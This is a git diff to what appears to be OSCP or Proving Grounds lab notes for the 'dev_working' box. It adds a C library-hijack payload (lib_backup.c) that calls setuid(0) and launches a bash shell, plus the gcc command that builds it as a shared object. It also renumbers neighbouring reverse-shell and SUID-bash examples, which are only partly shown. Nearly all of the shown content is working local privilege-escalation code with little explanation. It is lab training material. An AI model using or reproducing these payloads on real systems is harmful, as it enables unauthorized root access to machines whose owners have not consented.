@@ -95,7 +95,24 @@ reference :
 https://routezero.security/2025/02/19/proving-grounds-practice-dev_working-walkthrough/
 https://medium.com/@carlosbudiman/oscp-proving-grounds-dev-working-intermediate-linux-cd59f01b42c9
 
-Code example 01 (lib_backup.c): Reverse shell
+Code example 01 (lib_backup.c): LPE
+```
+Code :
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void advance_backup_custom_implementation() {
+    setuid(0); // Elevate privileges to root
+    system("/bin/bash");
+    printf("Backup completed by the dynamic library.\n");
+}
+
+Exploitation :
+gcc -shared -fPIC -o lib_backup.so lib_backup.c
+```
+
+Code example 02 (lib_backup.c): Reverse shell
 ```
 Code :
 #include <stdio.h>  
@@ -116,7 +133,7 @@ Exploitation :
 gcc -shared -fPIC -o lib_backup.so lib_backup.c
 ```
 
-Code example 02 (lib_backup.c): Create SUID on bash
+Code example 03 (lib_backup.c): Create SUID on bash
 ```
 Code :
 #include <stdio.h>  
